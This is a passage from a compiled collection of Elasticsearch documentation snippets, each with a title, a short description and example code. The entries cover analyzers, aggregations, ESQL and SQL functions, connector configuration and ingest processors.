DESCRIPTION: This example creates a custom case-insensitive Stop filter that removes only the specified stop words 'and', 'is', and 'the'.

LANGUAGE: console
CODE:
PUT /my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "default": {
          "tokenizer": "whitespace",
          "filter": [ "my_custom_stop_words_filter" ]
        }
      },
      "filter": {
        "my_custom_stop_words_filter": {
          "type": "stop",
          "ignore_case": true,
          "stopwords": [ "and", "is", "the" ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Defining ZoneRulesException Class
DESCRIPTION: Defines the exception class for handling timezone rule related errors.

LANGUAGE: java
CODE:
class java.time.zone.ZoneRulesException {
  (String)
}

----------------------------------------

TITLE: Performing Division in Elasticsearch SQL
DESCRIPTION: Shows how to use the division operator (/) in an Elasticsearch SQL query. This operation divides one numeric value by another and returns the quotient.

LANGUAGE: sql
CODE:
SELECT 6 / 3 AS x;

----------------------------------------

TITLE: String Trimming with LTRIM in ESQL
DESCRIPTION: Example showing how to remove leading whitespace from strings using LTRIM and then wrap the results in single quotes using CONCAT. The query processes two fields: 'message' and 'color', removing leading spaces and adding surrounding quotes.

LANGUAGE: esql
CODE:
ROW message = "   some text  ",  color = " red "
| EVAL message = LTRIM(message)
| EVAL color = LTRIM(color)
| EVAL message = CONCAT("'", message, "'")
| EVAL color = CONCAT("'", color, "'")

----------------------------------------

TITLE: Using MV_MIN Function in Elasticsearch ESQL
DESCRIPTION: The MV_MIN function converts a multivalued expression into a single valued column containing the minimum value. It is used within the EVAL clause of an ESQL query.

LANGUAGE: sql
CODE:
ROW a=[2, 1]
| EVAL min_a = MV_MIN(a)

----------------------------------------

TITLE: Displaying Supported Types for ESQL Function Test in Markdown
DESCRIPTION: This markdown table shows the supported field types and their corresponding result types for an ESQL function test case. It includes various data types such as date, double, integer, keyword, long, text, and unsigned_long, all of which result in a date type.

LANGUAGE: markdown
CODE:
| field | result |
| --- | --- |
| date | date |
| date_nanos | date |
| double | date |
| integer | date |
| keyword | date |
| long | date |
| text | date |
| unsigned_long | date |

----------------------------------------

TITLE: Keeping Specific Fields with Remove Processor in Elasticsearch
DESCRIPTION: This example illustrates how to use the Remove processor's 'keep' option to remove all fields except the specified one ('url') from a document in an Elasticsearch ingest pipeline.

LANGUAGE: json
CODE:
{
  "remove": {
    "keep": ["url"]
  }
}

----------------------------------------

TITLE: Unsupported TIME Data Type in GROUP BY Clause
DESCRIPTION: Illustrates an unsupported query using the TIME data type directly in a GROUP BY clause.

LANGUAGE: sql
CODE:
SELECT count(*) FROM test GROUP BY CAST(date_created AS TIME);

----------------------------------------

TITLE: Creating API Key for Azure Blob Storage Connector
DESCRIPTION: Example of creating an API key for the Azure Blob Storage connector using the Elasticsearch API. This key is used for authentication and authorization.

LANGUAGE: console
CODE:
POST /_security/api_key
{
  "name": "connector_name-connector-api-key",
  "role_descriptors": {
    "connector_name-connector-role": {
      "cluster": [
        "monitor",
        "manage_connector"
      ],
      "indices": [
        {
          "names": [
            "index_name",
            ".search-acl-filter-index_name",
            ".elastic-connectors*"
          ],
          "privileges": [
            "all"
          ],
          "allow_restricted_indices": false
        }
      ]
    }
  }
}

----------------------------------------

TITLE: Converting and Using Time Duration in ESQL
DESCRIPTION: This snippet demonstrates how to convert a string to a time_duration value and use it in date arithmetic operations. It shows adding a duration to a datetime and subtracting an equivalent duration using the to_timeduration function.

LANGUAGE: sql
CODE:
row x = "2024-01-01"::datetime | eval y = x + "3 hours"::time_duration, z = x - to_timeduration("3 hours");

----------------------------------------

TITLE: Computing SHA1 Hash in Elasticsearch SQL
DESCRIPTION: This SQL query demonstrates how to use the SHA1 function in Elasticsearch to compute the hash of a message field. It filters out connection error messages, computes the SHA1 hash, and keeps only the original message and its hash.

LANGUAGE: sql
CODE:
FROM sample_data
| WHERE message != "Connection error"
| EVAL sha1 = sha1(message)
| KEEP message, sha1

----------------------------------------

TITLE: Converting String Values to Unsigned Long in ESQL
DESCRIPTION: Demonstrates converting string representations of numbers to unsigned long values using TO_UNSIGNED_LONG and its aliases (TO_ULONG, TO_UL). The example shows conversion of both integer and decimal string values, as well as invalid input.

LANGUAGE: sql
CODE:
ROW str1 = "2147483648", str2 = "2147483648.2", str3 = "foo"
| EVAL long1 = TO_UNSIGNED_LONG(str1), long2 = TO_ULONG(str2), long3 = TO_UL(str3)

----------------------------------------

TITLE: Stemmer Override Rules File Content in Elasticsearch
DESCRIPTION: This snippet shows the content of a stemmer override rules file. It defines custom stemming rules for 'running' and 'runs' to 'run', and prevents 'stemmer' from being modified.

LANGUAGE: text
CODE:
running, runs => run

stemmer => stemmer

----------------------------------------

TITLE: Wildcard Field Mapping and Search
DESCRIPTION: Example showing how to map and search a wildcard field optimized for grep-like queries on unstructured content.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "my_wildcard": {
        "type": "wildcard"
      }
    }
  }
}

PUT my-index-000001/_doc/1
{
  "my_wildcard" : "This string can be quite lengthy"
}

GET my-index-000001/_search
{
  "query": {
    "wildcard": {
      "my_wildcard": {
        "value": "*quite*lengthy"
      }
    }
  }
}

----------------------------------------

TITLE: Creating Custom Analyzer with Dictionary Decompounder
DESCRIPTION: Example of creating a custom analyzer with a dictionary_decompounder filter that uses a word list file and maximum subword size configuration.

LANGUAGE: console
CODE:
PUT dictionary_decompound_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "standard_dictionary_decompound": {
          "tokenizer": "standard",
          "filter": [ "22_char_dictionary_decompound" ]
        }
      },
      "filter": {
        "22_char_dictionary_decompound": {
          "type": "dictionary_decompounder",
          "word_list_path": "analysis/example_word_list.txt",
          "max_subword_size": 22
        }
      }
    }
  }
}

----------------------------------------

TITLE: Customizing Unique Token Filter in Elasticsearch
DESCRIPTION: This example demonstrates how to create a custom unique filter with the only_on_same_position parameter set to true, and use it in a custom analyzer.

LANGUAGE: console
CODE:
PUT letter_unique_pos_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "letter_unique_pos": {
          "tokenizer": "letter",
          "filter": [ "unique_pos" ]
        }
      },
      "filter": {
        "unique_pos": {
          "type": "unique",
          "only_on_same_position": true
        }
      }
    }
  }
}

----------------------------------------

TITLE: Using SCORE Function in Elasticsearch SQL
DESCRIPTION: The SCORE function returns the relevance score of a document for a given query. It's typically used for ordering results based on relevance.

LANGUAGE: sql
CODE:
SCORE()

LANGUAGE: sql
CODE:
SELECT SCORE(), * FROM library WHERE MATCH(name, 'dune') ORDER BY SCORE() DESC;

LANGUAGE: sql
CODE:
SELECT SCORE() AS score, name, release_date FROM library WHERE QUERY('dune') ORDER BY YEAR(release_date) DESC;

----------------------------------------

TITLE: Configuring Tracing in Elasticsearch YAML
DESCRIPTION: Basic YAML configuration to enable tracing in Elasticsearch and specify the APM server URL. This snippet demonstrates the minimal required settings to activate tracing functionality.

LANGUAGE: yaml
CODE:
telemetry.tracing.enabled: true
telemetry.agent.server_url: https://<your-apm-server>:443

----------------------------------------

TITLE: Configuring Synonym Filter with File Path in Elasticsearch
DESCRIPTION: JSON configuration for a synonym filter using a file path to define synonyms in Elasticsearch.

LANGUAGE: json
CODE:
{
  "filter": {
    "synonyms_filter": {
      "type": "synonym",
      "synonyms_path": "analysis/synonym-set.txt"
    }
  }
}

----------------------------------------

TITLE: High-Precision Geohex Grid Aggregation with Bounding Box in Elasticsearch
DESCRIPTION: This snippet shows how to perform a high-precision geohex_grid aggregation with a geo_bounding_box filter to narrow the subject area and prevent excessive bucket creation.

LANGUAGE: console
CODE:
POST /museums/_search?size=0
{
  "aggregations": {
    "zoomed-in": {
      "filter": {
        "geo_bounding_box": {
          "location": {
            "top_left": "POINT (4.9 52.4)",
            "bottom_right": "POINT (5.0 52.3)"
          }
        }
      },
      "aggregations": {
        "zoom1": {
          "geohex_grid": {
            "field": "location",
            "precision": 12
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Markdown Inclusions for CATEGORIZE Function Documentation Sections
DESCRIPTION: Markdown code to include various documentation sections for the CATEGORIZE function, including parameters, description, types, and examples.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/categorize.md
:::

:::{include} ../description/categorize.md
:::

:::{include} ../types/categorize.md
:::

:::{include} ../examples/categorize.md
:::

----------------------------------------

TITLE: Elasticsearch Query with Bucket Script Aggregation
DESCRIPTION: This Elasticsearch query demonstrates the use of a bucket_script aggregation with a Painless script. It calculates the spread plus base cost for theater ticket prices, using min and max aggregations and a custom base_cost parameter.

LANGUAGE: json
CODE:
GET /seats/_search
{
  "size": 0,
  "aggs": {
    "theatres": {
      "terms": {
        "field": "theatre",
        "size": 10
      },
      "aggs": {
        "min_cost": {
          "min": {
            "field": "cost"
          }
        },
        "max_cost": {
          "max": {
            "field": "cost"
          }
        },
        "spread_plus_base": {
          "bucket_script": {
            "buckets_path": {
              "min": "min_cost",
              "max": "max_cost"
            },
            "script": {
              "params": {
                "base_cost": 5
              },
              "source": "(params.max - params.min) + params.base_cost"
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Querying Elasticsearch for Specific Terms with Highlighting
DESCRIPTION: This query searches for documents containing both 'elasticsearch' and 'pozmantier', returning the title and source fields, and highlighting matches in the content field.

LANGUAGE: console
CODE:
GET news/_search
{
  "query": {
    "simple_query_string": {
      "query": "+elasticsearch  +pozmantier"
    }
  },
  "_source": [
    "title",
    "source"
  ],
  "highlight": {
    "fields": {
      "content": {}
    }
  }
}

----------------------------------------

TITLE: MIN with MV_AVG Function in ESQL
DESCRIPTION: Shows how to combine MIN with MV_AVG to calculate the minimum average of multiple values in the 'salary_change' column, assigning the result to 'min_avg_salary_change'.

LANGUAGE: esql
CODE:
FROM employees
| STATS min_avg_salary_change = MIN(MV_AVG(salary_change))

----------------------------------------

TITLE: Advanced Extraction Service Configuration
DESCRIPTION: Extended YAML configuration with optional advanced settings for the extraction service.

LANGUAGE: yaml
CODE:
# data-extraction-service settings
extraction_service:
  host: http://localhost:8090
  timeout: 30
  use_file_pointers: false
  stream_chunk_size: 65536
  shared_volume_dir: '/app/files'

----------------------------------------

TITLE: Including SHA256 Function Examples in Markdown
DESCRIPTION: This snippet uses an include directive to insert usage examples for the SHA256 function from an external Markdown file.

LANGUAGE: markdown
CODE:
:::{include} ../examples/sha256.md
:::

----------------------------------------

TITLE: Creating Custom Analyzer with Trim Filter
DESCRIPTION: Example demonstrating how to create a custom analyzer that uses the trim filter with the keyword tokenizer using the create index API.

LANGUAGE: console
CODE:
PUT trim_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "keyword_trim": {
          "tokenizer": "keyword",
          "filter": [ "trim" ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: SHOW TABLES with Single Character Wildcard in Elasticsearch SQL
DESCRIPTION: Using the LIKE clause with a single character wildcard to match table names.

LANGUAGE: sql
CODE:
SHOW TABLES LIKE 'em_';

----------------------------------------

TITLE: Configuring Synonym Filter with Inline Synonyms in Elasticsearch
DESCRIPTION: JSON configuration for a synonym filter with inline synonym definitions in Elasticsearch.

LANGUAGE: json
CODE:
{
  "filter": {
    "synonyms_filter": {
      "type": "synonym",
      "synonyms": ["pc => personal computer", "computer, pc, laptop"]
    }
  }
}

----------------------------------------

TITLE: ESQL Type Support Matrix
DESCRIPTION: Markdown table showing field types that can be converted to double type in ESQL functions. The table maps various input data types (boolean, counter types, date, numeric types, and text types) to their double output type.

LANGUAGE: markdown
CODE:
| field | result |
| --- | --- |
| boolean | double |
| counter_double | double |
| counter_integer | double |
| counter_long | double |
| date | double |
| double | double |
| integer | double |
| keyword | double |
| long | double |
| text | double |
| unsigned_long | double |

----------------------------------------

TITLE: Customizing Keys in Keyed Geo-distance Aggregation
DESCRIPTION: This example shows how to customize the keys for each range in a keyed geo-distance aggregation. It allows for more meaningful and descriptive bucket names in the response.

LANGUAGE: console
CODE:
POST /museums/_search?size=0
{
  "aggs": {
    "rings_around_amsterdam": {
      "geo_distance": {
        "field": "location",
        "origin": "POINT (4.894 52.3760)",
        "ranges": [
          { "to": 100000, "key": "first_ring" },
          { "from": 100000, "to": 300000, "key": "second_ring" },
          { "from": 300000, "key": "third_ring" }
        ],
        "keyed": true
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Slack Connector in YAML
DESCRIPTION: This snippet shows a sample YAML configuration for the Slack connector, including Elasticsearch connection details and connector settings.

LANGUAGE: yaml
CODE:
elasticsearch.host: http://host.docker.internal:9200
elasticsearch.api_key: <ELASTICSEARCH_API_KEY>

connectors:
  -
    connector_id: <CONNECTOR_ID_FROM_KIBANA>
    service_type: slack
    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead

----------------------------------------

TITLE: Configuring Custom Kuromoji Analyzer with ICU Normalization
DESCRIPTION: Creates a custom analyzer based on the Kuromoji analyzer that includes ICU normalization to properly handle full-width Japanese characters. The configuration adds the icu_normalizer character filter while maintaining all standard Kuromoji tokenization and filtering components.

LANGUAGE: console
CODE:
PUT index-00001
{
  "settings": {
    "index": {
      "analysis": {
        "analyzer": {
          "kuromoji_normalize": {
            "char_filter": [
              "icu_normalizer"
            ],
            "tokenizer": "kuromoji_tokenizer",
            "filter": [
              "kuromoji_baseform",
              "kuromoji_part_of_speech",
              "cjk_width",
              "ja_stop",
              "kuromoji_stemmer",
              "lowercase"
            ]
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Querying Database Name with DATABASE() Function in Elasticsearch SQL
DESCRIPTION: The DATABASE() function returns the name of the Elasticsearch cluster being queried. This function takes no input parameters and always returns a non-null string value representing the cluster name.

LANGUAGE: sql
CODE:
DATABASE()

LANGUAGE: sql
CODE:
SELECT DATABASE();

   DATABASE
---------------
elasticsearch

----------------------------------------

TITLE: Including QSTR Function Documentation Sections in Markdown
DESCRIPTION: This snippet demonstrates how to include various documentation sections for the QSTR function using Markdown include directives.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/qstr.md
:::

:::{include} ../description/qstr.md
:::

:::{include} ../types/qstr.md
:::

:::{include} ../functionNamedParams/qstr.md
:::

:::{include} ../examples/qstr.md
:::

----------------------------------------

TITLE: Basic Matrix Stats Aggregation Query in Elasticsearch
DESCRIPTION: Example of a basic matrix_stats aggregation that computes statistical relationships between poverty and income fields. Returns metrics including mean, variance, skewness, kurtosis, covariance, and correlation.

LANGUAGE: console
CODE:
GET /_search
{
  "aggs": {
    "statistics": {
      "matrix_stats": {
        "fields": [ "poverty", "income" ]
      }
    }
  }
}

----------------------------------------

TITLE: Querying Nested Properties Using Dot Notation in Elasticsearch
DESCRIPTION: Shows how to query and aggregate nested properties using dot notation in Elasticsearch. The example includes a match query on manager name and a histogram aggregation on employee ages.

LANGUAGE: console
CODE:
GET my-index-000001/_search
{
  "query": {
    "match": {
      "manager.name": "Alice White"
    }
  },
  "aggs": {
    "Employees": {
      "nested": {
        "path": "employees"
      },
      "aggs": {
        "Employee Ages": {
          "histogram": {
            "field": "employees.age",
            "interval": 5
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Calculating Second Order Derivative of Monthly Sales in Elasticsearch
DESCRIPTION: Shows how to calculate both first and second order derivatives of total monthly sales by chaining derivative aggregations. The second derivative's buckets_path points to the first derivative.

LANGUAGE: console
CODE:
POST /sales/_search
{
  "size": 0,
  "aggs": {
    "sales_per_month": {
      "date_histogram": {
        "field": "date",
        "calendar_interval": "month"
      },
      "aggs": {
        "sales": {
          "sum": {
            "field": "price"
          }
        },
        "sales_deriv": {
          "derivative": {
            "buckets_path": "sales"
          }
        },
        "sales_2nd_deriv": {
          "derivative": {
            "buckets_path": "sales_deriv"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: String Replacement in ESQL using REPLACE Function
DESCRIPTION: Demonstrates using the REPLACE function to substitute one string for another within a text field. The example creates a row with a string value, then uses REPLACE to change 'World' to 'Universe', and finally keeps only the modified string column.

LANGUAGE: esql
CODE:
ROW str = "Hello World"
| EVAL str = REPLACE(str, "World", "Universe")
| KEEP str

----------------------------------------

TITLE: Counting Rows with COUNT(*) and Grouping in ESQL
DESCRIPTION: This example shows how to count the total number of rows using COUNT(*), group the results by a column, and sort the output.

LANGUAGE: esql
CODE:
FROM employees
| STATS count = COUNT(*) BY languages
| SORT languages DESC

----------------------------------------

TITLE: Creating Custom Analyzer with Stop Filter in Elasticsearch
DESCRIPTION: This example shows how to use the Stop filter to configure a new custom analyzer using the Create Index API.

LANGUAGE: console
CODE:
PUT /my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "whitespace",
          "filter": [ "stop" ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Concatenating Strings with CONCAT and SPACE Functions in ESQL
DESCRIPTION: This snippet shows how to use the CONCAT function to join strings and the SPACE function to add a single space between words in ESQL. It creates a 'Hello World!' message and assigns it to a variable named 'message'.

LANGUAGE: esql
CODE:
ROW message = CONCAT("Hello", SPACE(1), "World!");

----------------------------------------

TITLE: Using DATETIME_FORMAT Function
DESCRIPTION: Examples of using DATETIME_FORMAT function to format dates and times as strings using Java DateTimeFormatter patterns.

LANGUAGE: sql
CODE:
SELECT DATETIME_FORMAT(CAST('2020-04-05' AS DATE), 'dd/MM/yyyy') AS "date";

LANGUAGE: sql
CODE:
SELECT DATETIME_FORMAT(CAST('2020-04-05T11:22:33.987654' AS DATETIME), 'dd/MM/yyyy HH:mm:ss.SS') AS "datetime";

LANGUAGE: sql
CODE:
SELECT DATETIME_FORMAT(CAST('11:22:33.987' AS TIME), 'HH mm ss.S') AS "time";

----------------------------------------

TITLE: Including HASH Function Examples in Markdown
DESCRIPTION: This snippet includes the content of a separate Markdown file containing usage examples for the HASH function.

LANGUAGE: markdown
CODE:
:::{include} ../examples/hash.md
:::

----------------------------------------

TITLE: Configuring Node Health and Monitoring Settings in Elasticsearch
DESCRIPTION: Dynamic cluster settings for enabling health node functionality and configuring local health monitoring intervals.

LANGUAGE: properties
CODE:
health.node.enabled: true
health.reporting.local.monitor.interval: <interval>

----------------------------------------

TITLE: Using MATCH Function in ESQL
DESCRIPTION: Demonstrates the usage of the MATCH function in ESQL for performing match queries on various field types. It supports function named parameters and all match query parameters from the Elasticsearch Query DSL.

LANGUAGE: markdown
CODE:
Use `MATCH` to perform a [match query](/reference/query-languages/query-dsl/query-dsl-match-query.md) on the specified field. Using `MATCH` is equivalent to using the `match` query in the Elasticsearch Query DSL.  Match can be used on fields from the text family like [text](/reference/elasticsearch/mapping-reference/text.md) and [semantic_text](/reference/elasticsearch/mapping-reference/semantic-text.md), as well as other field types like keyword, boolean, dates, and numeric types.  Match can use [function named parameters](/reference/query-languages/esql/esql-syntax.md#esql-function-named-params) to specify additional options for the match query. All [match query parameters](/reference/query-languages/query-dsl/query-dsl-match-query.md#match-field-params) are supported.  For a simplified syntax, you can use the [match operator](/reference/query-languages/esql/esql-functions-operators.md#esql-search-operators) `:` operator instead of `MATCH`.  `MATCH` returns true if the provided query matches the row.

----------------------------------------

TITLE: Using STARTS_WITH Function in ESQL Query
DESCRIPTION: Query that filters employee data to show last names and checks if they start with 'B'. Uses KEEP to retain only the last_name column and EVAL to create a new boolean column ln_S with the STARTS_WITH check result.

LANGUAGE: esql
CODE:
FROM employees
| KEEP last_name
| EVAL ln_S = STARTS_WITH(last_name, "B")

----------------------------------------

TITLE: Converting Array of Strings to Lowercase in ESQL
DESCRIPTION: Demonstrates how to convert an array of strings to lowercase using the TO_LOWER function. The function processes each element in the array and returns a new array with lowercase values.

LANGUAGE: esql
CODE:
ROW v = TO_LOWER(["Some", "Text"])

----------------------------------------

TITLE: Defining Supported Types for ESQL Function in Markdown
DESCRIPTION: This markdown table defines the supported input types and resulting output type for a specific ESQL function. It shows that the function accepts 'ip' type paired with either 'keyword' or 'text' type, always resulting in a boolean output.

LANGUAGE: markdown
CODE:
| ip | blockX | result |
| --- | --- | --- |
| ip | keyword | boolean |
| ip | text | boolean |

----------------------------------------

TITLE: Indexing a GeoJSON Polygon with Custom Orientation in Elasticsearch
DESCRIPTION: Example of indexing a polygon with a custom orientation using GeoJSON format in the geo_shape field.

LANGUAGE: console
CODE:
POST /example/_doc
{
  "location" : {
    "type" : "Polygon",
    "orientation" : "LEFT",
    "coordinates" : [
      [ [-177.0, 10.0], [176.0, 15.0], [172.0, 0.0], [176.0, -15.0], [-177.0, -10.0], [-177.0, 10.0] ]
    ]
  }
}

----------------------------------------

TITLE: Power Function Type Support Matrix
DESCRIPTION: Markdown table defining supported numeric type combinations for power operations in ESQL. Shows all valid combinations of base and exponent types, with all operations resulting in double type output.

LANGUAGE: markdown
CODE:
| base | exponent | result |
| --- | --- | --- |
| double | double | double |
| double | integer | double |
| double | long | double |
| double | unsigned_long | double |
| integer | double | double |
| integer | integer | double |
| integer | long | double |
| integer | unsigned_long | double |
| long | double | double |
| long | integer | double |
| long | long | double |
| long | unsigned_long | double |
| unsigned_long | double | double |
| unsigned_long | integer | double |
| unsigned_long | long | double |
| unsigned_long | unsigned_long | double |

----------------------------------------

TITLE: Elasticsearch Bucket Correlation Example with Latency Correlation
DESCRIPTION: Demonstrates a complete bucket correlation aggregation that correlates version terms with latency metrics using range aggregations and pre-calculated percentile values.

LANGUAGE: console
CODE:
POST correlate_latency/_search?size=0&filter_path=aggregations
{
  "aggs": {
    "buckets": {
      "terms": {
        "field": "version",
        "size": 2
      },
      "aggs": {
        "latency_ranges": {
          "range": {
            "field": "latency",
            "ranges": [
              { "to": 0.0 },
              { "from": 0, "to": 105 },
              { "from": 105, "to": 225 },
              { "from": 225, "to": 445 },
              { "from": 445, "to": 665 },
              { "from": 665, "to": 885 },
              { "from": 885, "to": 1115 },
              { "from": 1115, "to": 1335 },
              { "from": 1335, "to": 1555 },
              { "from": 1555, "to": 1775 },
              { "from": 1775 }
            ]
          }
        },
        "bucket_correlation": {
          "bucket_correlation": {
            "buckets_path": "latency_ranges>_count",
            "function": {
              "count_correlation": {
                "indicator": {
                   "expectations": [0, 52.5, 165, 335, 555, 775, 1000, 1225, 1445, 1665, 1775],
                   "doc_count": 200
                }
              }
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Using ENDS_WITH Function in ESQL Query for Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the ENDS_WITH function in an ESQL query. It checks if the 'last_name' field ends with the letter 'd' and creates a new boolean field 'ln_E' with the result.

LANGUAGE: sql
CODE:
FROM employees
| KEEP last_name
| EVAL ln_E = ENDS_WITH(last_name, "d")

----------------------------------------

TITLE: Calculating Spatial Extent with ST_EXTENT_AGG in Elasticsearch SQL
DESCRIPTION: This query demonstrates the use of ST_EXTENT_AGG function to calculate the spatial extent of a geometry field. It filters airports in India and computes the bounding box for their locations.

LANGUAGE: sql
CODE:
FROM airports
| WHERE country == "India"
| STATS extent = ST_EXTENT_AGG(location)

----------------------------------------

TITLE: Analyzing text with Porter stem filter in Elasticsearch
DESCRIPTION: This example demonstrates using the Elasticsearch analyze API with the porter_stem filter to stem the phrase 'the foxes jumping quickly'. The filter stems the words to their root forms.

LANGUAGE: console
CODE:
GET /_analyze
{
  "tokenizer": "standard",
  "filter": [ "porter_stem" ],
  "text": "the foxes jumping quickly"
}

----------------------------------------

TITLE: Using OR Operator in Elasticsearch SQL Query
DESCRIPTION: This example shows how to use the OR operator to combine two conditions in a SELECT statement. It retrieves employees with employee numbers less than 10003 or equal to 10005.

LANGUAGE: sql
CODE:
SELECT last_name l FROM "test_emp" WHERE emp_no < 10003 OR emp_no = 10005 ORDER BY emp_no LIMIT 5;

----------------------------------------

TITLE: Geohash Grid with Bounds Parameter
DESCRIPTION: Demonstrates using the bounds parameter to restrict geohash cells to a specific geographic area without requiring a separate query filter.

LANGUAGE: console
CODE:
POST /museums/_search?size=0
{
  "aggregations": {
    "tiles-in-bounds": {
      "geohash_grid": {
        "field": "location",
        "precision": 8,
        "bounds": {
          "top_left": "POINT (4.21875 53.4375)",
          "bottom_right": "POINT (5.625 52.03125)"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Creating Elasticsearch Mappings for Seat Data
DESCRIPTION: Defines the mapping schema for theater seat data with fields for theatre, play, actors, dates, costs, and seat details. Uses various Elasticsearch field types including keyword, double, integer, boolean, and date.

LANGUAGE: console
CODE:
PUT /seats
{
  "mappings": {
    "properties": {
      "theatre":  { "type": "keyword" },
      "play":     { "type": "keyword" },
      "actors":   { "type": "keyword" },
      "date":     { "type": "keyword" },
      "time":     { "type": "keyword" },
      "cost":     { "type": "double"  },
      "row":      { "type": "integer" },
      "number":   { "type": "integer" },
      "sold":     { "type": "boolean" },
      "datetime": { "type": "date"    }
    }
  }
}

----------------------------------------

TITLE: Simulating Redact Processor with IP Address Pattern in Elasticsearch
DESCRIPTION: This example demonstrates using the Redact processor to obscure an IP address in the 'message' field using a predefined Grok pattern. It uses the Simulate API to test the pipeline.

LANGUAGE: json
CODE:
POST _ingest/pipeline/_simulate
{
  "pipeline": {
    "description" : "Hide my IP",
    "processors": [
      {
        "redact": {
          "field": "message",
          "patterns": ["%{IP:client}"]
        }
      }
    ]
  },
  "docs":[
    {
      "_source": {
        "message": "55.3.244.1 GET /index.html 15824 0.043"
      }
    }
  ]
}

----------------------------------------

TITLE: Defining Solr Format Synonyms in Elasticsearch
DESCRIPTION: Examples of defining equivalent and explicit synonyms using the Solr format in Elasticsearch.

LANGUAGE: text
CODE:
ipod, i-pod, i pod
computer, pc, laptop

LANGUAGE: text
CODE:
personal computer => pc
sea biscuit, sea biscit => seabiscuit

----------------------------------------

TITLE: Indexing a Grandchild Document with Join Field in Elasticsearch
DESCRIPTION: This snippet demonstrates how to index a grandchild document using the join field, specifying the routing to ensure proper shard placement.

LANGUAGE: console
CODE:
PUT my-index-000001/_doc/3?routing=1&refresh
{
  "text": "This is a vote",
  "my_join_field": {
    "name": "vote",
    "parent": "2"
  }
}

----------------------------------------

TITLE: Using CHAR Function in Elasticsearch SQL
DESCRIPTION: Returns the character that has the ASCII code value specified by the numeric input.

LANGUAGE: sql
CODE:
SELECT CHAR(69);

   CHAR(69)
---------------
E

----------------------------------------

TITLE: Retrieving Geometry Type in Elasticsearch SQL
DESCRIPTION: The ST_GeometryType function returns the type of a geometry (e.g., POINT, MULTIPOINT, LINESTRING). It takes a geometry input and returns a string output.

LANGUAGE: sql
CODE:
SELECT ST_GeometryType(ST_WKTToSQL('POINT (10 20)')) type;

----------------------------------------

TITLE: Advanced Sync Rules for Redis Connector
DESCRIPTION: JSON examples of advanced sync rules for filtering data at the Redis source.

LANGUAGE: javascript
CODE:
[
  {
    "database": 0,
    "key_pattern": "alpha*"
  }
]

LANGUAGE: javascript
CODE:
[
  {
    "database": 0,
    "key_pattern": "alpha"
  }
]

LANGUAGE: javascript
CODE:
[
  {
    "database": 0,
    "key_pattern": "test[123]"
  }

LANGUAGE: javascript
CODE:
[
  {
    "database": 0,
    "key_pattern": "test[^123]"
  }
]

LANGUAGE: javascript
CODE:
[
  {
    "database": 0,
    "key_pattern": "*"
  }
]

LANGUAGE: javascript
CODE:
[
  {
    "database": 0,
    "key_pattern": "*",
    "type": "SET"
  }
]

LANGUAGE: javascript
CODE:
[
  {
    "database": 0,
    "type": "SET"
  }
]

----------------------------------------

TITLE: Percentile Ranks Aggregation with HDR Histogram in Elasticsearch
DESCRIPTION: Demonstrates using the HDR Histogram implementation for percentile ranks calculation, specifying the number of significant value digits.

LANGUAGE: console
CODE:
GET latency/_search
{
  "size": 0,
  "aggs": {
    "load_time_ranks": {
      "percentile_ranks": {
        "field": "load_time",
        "values": [ 500, 600 ],
        "hdr": {
          "number_of_significant_value_digits": 3
        }
      }
    }
  }
}

----------------------------------------

TITLE: Testing Keyword String Ending Function in Elasticsearch ESQL
DESCRIPTION: This SQL snippet defines test cases for an Elasticsearch ESQL function that checks if a keyword string ends with another string. It includes various scenarios to validate the function's behavior.

LANGUAGE: sql
CODE:
SELECT
    ENDS_WITH(NULL, 'foo') AS ends_with_null_keyword,
    ENDS_WITH('foo', NULL) AS ends_with_null_pattern,
    ENDS_WITH('foobar', 'bar') AS ends_with_true,
    ENDS_WITH('foobar', 'foo') AS ends_with_false,
    ENDS_WITH('foobar', '') AS ends_with_empty_string,
    ENDS_WITH('', '') AS ends_with_both_empty;

RESULT:
NULL, NULL, true, false, true, true

----------------------------------------

TITLE: Frequent Item Sets Aggregation with Two Fields and Exclude Parameter
DESCRIPTION: Example of a frequent item sets aggregation using async search, analyzing two fields and excluding specific values.

LANGUAGE: console
CODE:
POST /kibana_sample_data_ecommerce/_async_search
{
   "size":0,
   "aggs":{
      "my_agg":{
         "frequent_item_sets":{
            "minimum_set_size":3,
            "fields":[
               {
                  "field":"category.keyword"
               },
               {
                  "field":"geoip.city_name",
                  "exclude":"other"
               }
            ],
            "size":3
         }
      }
   }
}

----------------------------------------

TITLE: Configuring Custom Polish Analyzer in Elasticsearch
DESCRIPTION: Creates an index with a custom analyzer that replicates the built-in Polish analyzer functionality using standard tokenizer with lowercase, polish_stop and polish_stem filters. This configuration allows for further customization and extension of the analysis chain.

LANGUAGE: console
CODE:
PUT /stempel_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "rebuilt_stempel": {
          "tokenizer":  "standard",
          "filter": [
            "lowercase",
            "polish_stop",
            "polish_stem"
          ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Calculating Shard Routing in Elasticsearch
DESCRIPTION: Formulas used to determine which shard a document is routed to based on routing factor and number of shards.

LANGUAGE: text
CODE:
routing_factor = num_routing_shards / num_primary_shards
shard_num = (hash(_routing) % num_routing_shards) / routing_factor

----------------------------------------

TITLE: Indexing a MultiPolygon shape in WKT format
